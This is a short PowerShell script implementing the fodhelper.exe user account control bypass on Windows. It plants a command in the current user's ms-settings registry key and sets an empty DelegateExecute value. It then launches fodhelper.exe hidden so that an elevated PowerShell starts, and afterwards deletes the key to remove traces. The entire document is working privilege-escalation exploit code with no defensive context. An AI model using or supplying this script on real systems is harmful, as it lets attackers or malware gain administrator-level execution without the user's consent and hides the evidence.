# The command to execute in high integrity context
$cmd = "cmd /c start powershell.exe"
 
# Set the registry values
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
 
# Trigger fodhelper to perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
# Clean registry
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force